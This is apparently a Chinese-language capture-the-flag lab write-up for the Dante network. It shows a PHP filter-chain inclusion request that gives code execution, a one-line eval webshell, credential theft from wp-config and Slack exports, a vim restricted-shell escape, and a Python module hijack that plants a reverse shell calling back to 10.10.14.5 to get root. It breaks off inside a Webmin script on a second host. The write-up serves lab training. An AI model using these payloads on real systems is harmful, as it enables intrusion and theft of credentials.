<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/nav.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">172.16.1.10</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">4</span>

0=ls
</code></pre></div></div>
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102074816.png" alt="20240102074816" /></p>

<!-- ![Alt text](../../../../../assets/image-6.png) -->

<p>写入一个 webshell。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">0</span><span class="o">=</span><span class="nb">echo</span>+<span class="s1">'&lt;?php+eval($_POST["pass"]);'</span>+&gt;e.php
</code></pre></div></div>
<p>拿到 webshell 后在 wp-config.php 中获取到用户 margaret 的密码</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span> <span class="s1">'wordpress'</span> <span class="p">);</span>

<span class="cd">/** MySQL database username */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'margaret'</span> <span class="p">);</span>

<span class="cd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'Welcome1!2@3#'</span> <span class="p">);</span>

<span class="cd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>
</code></pre></div></div>
<p>但比较奇怪的是连接数据库时返回 Access Deny。</p>

<p>使用 ssh 进行连接时发现该用户不允许远程登陆。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DANTE-WEB-NIX01:/tmp# ssh margaret@172.16.1.10
/etc/ssh/ssh_config: line 53: Bad configuration option: denyusers
/etc/ssh/ssh_config: line 54: Bad configuration option: permitrootlogin
/etc/ssh/ssh_config: terminating, 2 bad configuration options
</code></pre></div></div>

<h2 id="提权到-margaret-bash-逃逸">提权到 margaret: bash 逃逸</h2>
<p>反弹 shell 后可以 su 切换到 margaret 用户，但很多命令无法使用：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You are <span class="k">in </span>a limited shell.
Type <span class="s1">'?'</span> or <span class="s1">'help'</span> to get the list of allowed commands
</code></pre></div></div>
<p>只能使用下面的几个命令。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margaret:~<span class="nv">$ </span><span class="nb">help
cd  </span>clear  <span class="nb">exit  help  history  </span>lpath  lsudo  vim
</code></pre></div></div>
<p>查询 gtfobins，vim 可以打开 shell、文件读取、文件下载等。</p>

<p>但目标的限制很多，包括 shell 的限制，文件路径限制等。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">***</span> forbidden path: /root/flag.txt
</code></pre></div></div>
<p>直接执行 <code class="language-plaintext highlighter-rouge">vim -c ':set shell=/bin/sh|:shell'</code> 会被限制。但如果先进入 vim，然后再执行 <code class="language-plaintext highlighter-rouge">:set shell=/bin/sh|:shell</code> 即可绕过限制。</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
1
channels.json
Desktop
Documents
Downloads
dpipe
flag.txt
flag.txt~
flag.txy~
flag.txz~
integration_logs.json
linpeas_fat.sh
linpeas.sh
Music
out1.txt
out2.txt
Pictures
project
Public
secure
snap
sudo
team
Templates
test
users.json
Videos
welcome
</code></pre></div></div>
<p>绕过之后还是无法读取 /root/flag.txt</p>

<h2 id="提权到-root-traitor未成功">提权到 root: traitor（未成功）</h2>
<p>上传 traitor，traitor 是一个集成了 gtfobins 和 linux 常见提权漏洞的扫描和利用工具。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                     
░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                            
https://github.com/liamg/traitor                                                                                             
                                                                                                                             
<span class="o">[</span>+] Assessing machine state...                                                                                               
<span class="o">[</span>+] Checking <span class="k">for </span>opportunities...
<span class="o">[</span>+][polkit:CVE-2021-3560] Polkit version is vulnerable!
<span class="o">[</span>+][polkit:CVE-2021-3560] System is vulnerable! Run again with <span class="s1">'--exploit polkit:CVE-2021-3560'</span> to exploit it.
<span class="o">[</span>+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable!
<span class="o">[</span>+][kernel:CVE-2022-0847] System is vulnerable! Run again with <span class="s1">'--exploit kernel:CVE-2022-0847'</span> to exploit it.
</code></pre></div></div>
<p>尝试了 CVE-2021-3560 和 CVE-2022-0847 均无法成功。</p>

<h2 id="提权到-frank-slack-渗透">提权到 frank: Slack 渗透</h2>
<p>查看 进程列表发现 frank 用户使用了 Slack。在 /home/frank/Downloads/ 目录下发现了导出文件：Test Workspace Slack export May 17 2020 - May 18 2020.zip</p>

<p>将导出文件下载到本地。其中 secure/2020-05-18.json 中包含了部分聊天记录。提取聊天内容：</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;@U013CT40QHM&gt; set the channel purpose: discuss network security"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;@U014025GL3W&gt; has joined the channel"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Hi Margaret, I created the channel so we can discuss the network security - in private!"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Hi Margaret,
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Great</span><span class="w"> </span><span class="err">idea,</span><span class="w"> </span><span class="err">Frank</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Great</span><span class="w"> </span><span class="err">idea,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"We need to migrate the Slack workspace to the new Ubuntu images,
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Sure,</span><span class="w"> </span><span class="err">but</span><span class="w"> </span><span class="err">I</span><span class="w"> </span><span class="err">need</span><span class="w"> </span><span class="err">my</span><span class="w"> </span><span class="err">password</span><span class="w"> </span><span class="err">for</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">Ubuntu</span><span class="w"> </span><span class="err">images,</span><span class="w"> </span><span class="err">I</span><span class="w"> </span><span class="err">haven't</span><span class="w"> </span><span class="err">been</span><span class="w"> </span><span class="err">given</span><span class="w"> </span><span class="err">it</span><span class="w"> </span><span class="err">yet</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Sure,</span><span class="w"> </span><span class="err">but</span><span class="w"> </span><span class="err">I</span><span class="w"> </span><span class="err">need</span><span class="w"> </span><span class="err">my</span><span class="w"> </span><span class="err">password</span><span class="w"> </span><span class="err">for</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">Ubuntu</span><span class="w"> </span><span class="err">images,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ahh sorry about that - its STARS5678FORTUNE401"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Thanks very much, I'll get on that now."</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Thanks very much,
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">No</span><span class="w"> </span><span class="err">problem</span><span class="w"> </span><span class="err">at</span><span class="w"> </span><span class="err">all.</span><span class="w"> </span><span class="err">I'll</span><span class="w"> </span><span class="err">make</span><span class="w"> </span><span class="err">this</span><span class="w"> </span><span class="err">channel</span><span class="w"> </span><span class="err">private</span><span class="w"> </span><span class="err">from</span><span class="w"> </span><span class="err">now</span><span class="w"> </span><span class="err">on</span><span class="w"> </span><span class="err">-</span><span class="w"> </span><span class="err">we</span><span class="w"> </span><span class="err">cant</span><span class="w"> </span><span class="err">risk</span><span class="w"> </span><span class="err">another</span><span class="w"> </span><span class="err">breach</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Please</span><span class="w"> </span><span class="err">get</span><span class="w"> </span><span class="err">rid</span><span class="w"> </span><span class="err">of</span><span class="w"> </span><span class="err">my</span><span class="w"> </span><span class="err">admin</span><span class="w"> </span><span class="err">privs</span><span class="w"> </span><span class="err">on</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">Ubuntu</span><span class="w"> </span><span class="err">box</span><span class="w"> </span><span class="err">and</span><span class="w"> </span><span class="err">go</span><span class="w"> </span><span class="err">ahead</span><span class="w"> </span><span class="err">and</span><span class="w"> </span><span class="err">make</span><span class="w"> </span><span class="err">yourself</span><span class="w"> </span><span class="err">an</span><span class="w"> </span><span class="err">admin</span><span class="w"> </span><span class="err">account</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Thanks,</span><span class="w"> </span><span class="err">will</span><span class="w"> </span><span class="err">do</span><span class="s2">",
"</span><span class="err">text</span><span class="s2">": "</span><span class="err">Thanks,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"I also set you a new password on the Ubuntu box - 69F15HST1CX, same username"</span><span class="err">,</span><span class="w">
</span><span class="nl">"text"</span><span class="p">:</span><span class="w"> </span><span class="s2">"I also set you a new password on the Ubuntu box - 69F15HST1CX,
</span></code></pre></div></div>

<p>frank/69F15HST1CX</p>

<p>但该密码无法正常登陆至 frank。Slack 导出文件可能对聊天记录中的敏感内容进行了。加密，原始记录所在路径为：~/.config/Slack/exported_data/secure/2020-05-18.json</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"text"</span>: <span class="s2">"&lt;@U013CT40QHM&gt; set the channel purpose: discuss network security"</span>,
<span class="s2">"text"</span>: <span class="s2">"&lt;@U014025GL3W&gt; has joined the channel"</span>,
<span class="s2">"text"</span>: <span class="s2">"Hi Margaret, I created the channel so we can discuss the network security - in private!"</span>,
<span class="s2">"text"</span>: <span class="s2">"Hi Margaret,
"</span>text<span class="s2">": "</span>Great idea, Frank<span class="s2">",
"</span>text<span class="s2">": "</span>Great idea,
<span class="s2">"text"</span>: <span class="s2">"We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"</span>,
<span class="s2">"text"</span>: <span class="s2">"We need to migrate the Slack workspace to the new Ubuntu images,
"</span>text<span class="s2">": "</span>Sure, but I need my password <span class="k">for </span>the Ubuntu images, I haven<span class="s1">'t been given it yet",
"text": "Sure, but I need my password for the Ubuntu images,
"text": "Ahh sorry about that - its STARS5678FORTUNE401",
"text": "Thanks very much, I'</span>ll get on that now.<span class="s2">",
"</span>text<span class="s2">": "</span>Thanks very much,
<span class="s2">"text"</span>: <span class="s2">"No problem at all. I'll make this channel private from now on - we cant risk another breach"</span>,
<span class="s2">"text"</span>: <span class="s2">"Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account"</span>,
<span class="s2">"text"</span>: <span class="s2">"Thanks, will do"</span>,
<span class="s2">"text"</span>: <span class="s2">"Thanks,
"</span>text<span class="s2">": "</span>I also <span class="nb">set </span>you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username<span class="s2">",
"</span>text<span class="s2">": "</span>I also <span class="nb">set </span>you a new password on the Ubuntu box - TractorHeadtorchDeskmat,
</code></pre></div></div>
<p>正确密码应该是 TractorHeadtorchDeskmat。</p>

<h2 id="提权到-root-python-劫持">提权到 root: python 劫持</h2>
<p>注意到 linPEAS 结果中的一个条目：<code class="language-plaintext highlighter-rouge">Searching root files in home dirs</code>，其中包含了文件：/home/frank/apache_restart.py</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">call</span>
<span class="kn">import</span> <span class="n">urllib</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="nf">urlopen</span><span class="p">(</span><span class="n">localhost</span><span class="p">)</span>
<span class="n">page</span><span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="nf">getcode</span><span class="p">()</span>
<span class="k">if</span> <span class="n">page</span> <span class="o">==</span><span class="mi">200</span><span class="p">:</span>
        <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">We</span><span class="sh">'</span><span class="s">re all good!</span><span class="sh">"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">We</span><span class="sh">'</span><span class="s">re failing!</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">call</span><span class="p">([</span><span class="sh">"</span><span class="s">systemctl start apache2</span><span class="sh">"</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>
<p>可以看到该脚本的属主为 root，且功能是监控 apache2 的状态并完成 apache2 的启动。但该脚本没有添加循环，猜测是否使用了定时任务或者使用了 while 循环来执行。</p>

<p>使用 ps 查看进程，发现该脚本没有直接运行。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | <span class="nb">grep </span>apache_restart
frank      23140  0.0  0.0   3312   720 ?        S    22:45   0:00 <span class="nb">grep </span>apache_restart
</code></pre></div></div>

<p>查看定时任务目录，搜索 apache_restart 也同样没有结果，该定时任务可能是隐藏的。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /etc/cron.d
<span class="nb">grep</span> <span class="nt">-r</span> apache_restart
</code></pre></div></div>

<p>使用 pspy 可以查找到隐藏的定时任务，可以看到是 root 用户直接用 /usr/sbin/CRON 执行 apache_restart.py。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2023/12/25 22:57:59 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1      | /sbin/init auto noprompt 
2023/12/25 22:58:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24240  | /usr/sbin/CRON <span class="nt">-f</span> 
2023/12/25 22:58:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24242  | /bin/sh <span class="nt">-c</span> python3 /home/frank/apache_restart.py<span class="p">;</span> <span class="nb">sleep </span>1<span class="p">;</span> <span class="nb">rm</span> /home/frank/call.py<span class="p">;</span> <span class="nb">sleep </span>1<span class="p">;</span> <span class="nb">rm</span> /home/frank/urllib.py                                                                                      
2023/12/25 22:58:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24243  | python3 /home/frank/apache_restart.py 
2023/12/25 22:58:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24244  | <span class="nb">sleep </span>1 
2023/12/25 22:58:02 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>24245  | /snap/slack/65/usr/lib/slack/slack <span class="nt">--no-sandbox</span> <span class="nt">--executed-from</span><span class="o">=</span>/home/frank <span class="nt">--pid</span><span class="o">=</span>1805 <span class="nt">--enable-crashpad</span>                                                                                                  
2023/12/25 22:58:02 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24246  | <span class="nb">rm</span> /home/frank/call.py 
2023/12/25 22:58:02 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24247  | <span class="nb">sleep </span>1 
2023/12/25 22:58:03 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24248  | 
</code></pre></div></div>
<p>但 apache_restart.py 本身无法修改，但 apache_restart.py 调用了 call.py 和 urllib 库，由于 python 中调用库时会优先从当前目录加载，如果直接在 /home/frank 目录下写入 urllib.py，那么程序会优先加载我们编写的 urllib.py。</p>

<p>编写一个反弹 shell 的 python 脚本。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span><span class="p">,</span><span class="n">pty</span><span class="p">,</span><span class="n">socket</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">();</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">10.10.14.5</span><span class="sh">"</span><span class="p">,</span><span class="mi">9998</span><span class="p">));[</span><span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="n">f</span><span class="p">)</span><span class="k">for</span> <span class="n">f</span> <span class="ow">in</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span><span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p>监听 9998 端口</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 9998
</code></pre></div></div>
<p>将 python 脚本写入 /home/frank/urllib.py</p>

<p>等待一段时间后成功得到 root shell。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nc <span class="nt">-lvvp</span> 9998
Listening on 0.0.0.0 9998
Connection received on 10.10.110.3 19185
root@DANTE-NIX02:~# <span class="nb">pwd
pwd</span>
/root
root@DANTE-NIX02:~# <span class="nb">cat</span> /root/flag.txt
<span class="nb">cat</span> /root/flag.txt
DANTE<span class="o">{</span>L0v3_m3_S0m3_H1J4CK1NG_XD<span class="o">}</span>
root@DANTE-NIX02:~# 
</code></pre></div></div>

<h1 id="linux-17216117">Linux: 172.16.1.17</h1>
<p>开放端口：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.1.17	80
172.16.1.17	139
172.16.1.17	445
172.16.1.17	10000
</code></pre></div></div>
<h2 id="80-端口源码泄露">80 端口源码泄露</h2>
<p>80 端口部署了 Apache 服务，给出了一个 webmin-1.900.zip 文件。</p>

<p>泄露出的 webmin 版本为 1.900，该版本存在诸多漏洞，可以直接在 searchsploit 中搜索。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Webmin 1.900 - Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                       | cgi/remote/46201.rb
Webmin 1.910 - <span class="s1">'Package Updates'</span> Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                     | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                       | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                          | linux/remote/47230.rb
Webmin 1.962 - <span class="s1">'Package Updates'</span> Escape Bypass RCE <span class="o">(</span>Metasploit<span class="o">)</span>                            | linux/webapps/49318.rb
Webmin 1.973 - <span class="s1">'run.cgi'</span> Cross-Site Request Forgery <span class="o">(</span>CSRF<span class="o">)</span>                                 | linux/webapps/50144.py
Webmin 1.973 - <span class="s1">'save_user.cgi'</span> Cross-Site Request Forgery <span class="o">(</span>CSRF<span class="o">)</span>                           | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                                       | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution <span class="o">(</span>RCE<span class="o">)</span> <span class="o">(</span>Authenticated<span class="o">)</span>                                 | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                                                  | cgi/webapps/24574.txt
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                               | multiple/remote/1997.php
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                               | multiple/remote/2017.pl
Webmin &lt; 1.920 - <span class="s1">'rpc.cgi'</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                              | linux/webapps/47330.rb
<span class="nt">-------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results

</code></pre></div></div>

<p>http://172.16.1.17/webmin/ 直接给出了一个 perl 文件。</p>
<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
<span class="c1"># Display all Webmin modules visible to the current user</span>

<span class="k">BEGIN</span> <span class="p">{</span> <span class="nb">push</span><span class="p">(</span><span class="nv">@INC</span><span class="p">,</span> <span class="p">"</span><span class="s2">.</span><span class="p">");</span> <span class="p">};</span>
<span class="k">use</span> <span class="nv">WebminCore</span><span class="p">;</span>

<span class="nv">&amp;init_config</span><span class="p">();</span>
<span class="nv">&amp;ReadParse</span><span class="p">();</span>
<span class="nv">$hostname</span> <span class="o">=</span> <span class="nv">&amp;get_display_hostname</span><span class="p">();</span>
<span class="nv">$ver</span> <span class="o">=</span> <span class="nv">&amp;get_webmin_version</span><span class="p">();</span>
<span class="nv">&amp;get_miniserv_config</span><span class="p">(</span><span class="o">\</span><span class="nv">%miniserv</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">real_os_type</span><span class="p">'})</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">os_version</span><span class="p">'}</span> <span class="ow">eq</span> <span class="p">"</span><span class="s2">*</span><span class="p">")</span> <span class="p">{</span>
		<span class="nv">$ostr</span> <span class="o">=</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">real_os_type</span><span class="p">'};</span>
		<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="nv">$ostr</span> <span class="o">=</span> <span class="p">"</span><span class="si">$gconfig</span><span class="s2">{'real_os_type'} </span><span class="si">$gconfig</span><span class="s2">{'real_os_version'}</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
	<span class="nv">$ostr</span> <span class="o">=</span> <span class="p">"</span><span class="si">$gconfig</span><span class="s2">{'os_type'} </span><span class="si">$gconfig</span><span class="s2">{'os_version'}</span><span class="p">";</span>
	<span class="p">}</span>
<span class="nv">%access</span> <span class="o">=</span> <span class="nv">&amp;get_module_acl</span><span class="p">();</span>

<span class="c1"># Build a list of all modules</span>
<span class="nv">@modules</span> <span class="o">=</span> <span class="nv">&amp;get_visible_module_infos</span><span class="p">();</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}))</span> <span class="p">{</span>
	<span class="c1"># Maybe redirect to some module after login</span>
	<span class="nb">local</span> <span class="nv">$goto</span> <span class="o">=</span> <span class="nv">&amp;get_goto_module</span><span class="p">(</span><span class="o">\</span><span class="nv">@modules</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$goto</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">&amp;redirect</span><span class="p">(</span><span class="nv">$goto</span><span class="o">-&gt;</span><span class="p">{'</span><span class="s1">dir</span><span class="p">'}</span><span class="o">.</span><span class="p">'</span><span class="s1">/</span><span class="p">');</span>
		<span class="nb">exit</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

<span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">sysinfo</span><span class="p">'}</span> <span class="o">=</span> <span class="mi">0</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">sysinfo</span><span class="p">'}</span> <span class="o">==</span> <span class="mi">1</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">texttitles</span><span class="p">'})</span> <span class="p">{</span>
